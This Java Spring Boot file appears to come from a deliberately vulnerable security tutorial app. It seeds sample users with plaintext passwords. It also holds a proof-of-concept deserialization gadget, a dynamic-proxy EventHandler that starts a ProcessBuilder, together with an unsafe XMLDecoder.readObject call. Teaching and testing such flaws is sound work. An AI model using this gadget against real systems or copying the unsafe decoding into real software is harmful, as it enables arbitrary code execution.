package tk.tutorial.security.requestvuln;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import tk.tutorial.security.requestvuln.model.Commentary;
import tk.tutorial.security.requestvuln.model.Gender;
import tk.tutorial.security.requestvuln.model.MaritalStatus;
import tk.tutorial.security.requestvuln.model.Person;
import tk.tutorial.security.requestvuln.repository.CommentaryRepository;
import tk.tutorial.security.requestvuln.repository.PersonRepository;

import java.beans.XMLDecoder;
import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

@SpringBootApplication
public class RequestvulnApplication implements CommandLineRunner {

    @Autowired
    PersonRepository personRepository;

    @Autowired
    CommentaryRepository commentaryRepository;

    public static void main(String[] args) {
         SpringApplication.run(RequestvulnApplication.class, args);
    }

    @Override
    public void run(String... args) throws Exception {

        String birthDateString = "15.10.1995";
        DateFormat format = new SimpleDateFormat("DD.MM.YYYY");
        Date date = format.parse(birthDateString);


        personRepository.save(new Person("tobias1", "kolb", "95512", date, Gender.MALE, "tobi1", "passwd", MaritalStatus.MARRIED));
        personRepository.save(new Person("tobias2", "kolb", "95512", date, Gender.FEMALE, "tobi2", "test", MaritalStatus.MARRIED));
        personRepository.save(new Person("tobias3", "kolb", "95512", date, Gender.DIVERSE, "tobi3", "password", MaritalStatus.WIDOWD));
        personRepository.save(new Person("tobias4", "kolb", "95512", date, Gender.MALE, "tobi4", "testtest", MaritalStatus.SINGLE));

        commentaryRepository.save(new Commentary("Das ist der erste Kommentar"));
        commentaryRepository.save(new Commentary("Das ist der zweite Kommentar"));
        commentaryRepository.save(new Commentary("Das ist der dritte Kommentar"));
        commentaryRepository.save(new Commentary("Das ist der vierte Kommentar"));

    }

    private static void poc() throws FileNotFoundException {
        String process = "open";
        String arguments = "/Application/Calculator.app";

        String payload = "<sorted-set>" +
                "<string>foo</string>" +
                "<dynamic-proxy>" +
                "<interface>java.lang.Comparable</interface>" +
                "<handler class=\"java.beans.EventHandler\">" +
                "   <target class=\"java.lang.ProcessBuilder\">" +
                "       <command>" +
                "           <string>" + process + "</string>" +
                "           <string>" + arguments + "</string>" +
                "       </command>" +
                "   </target>" +
                "   <action>start</action>" +
                "</handler>" +
                "</dynamic-proxy>" +
                "</sorted-set>";

        XMLDecoder decoder = new XMLDecoder(
                new BufferedInputStream(
                        new FileInputStream("../../../../resources/xml/test.xml")
                )
        );

        Object object = decoder.readObject();
        decoder.close();
    }
}
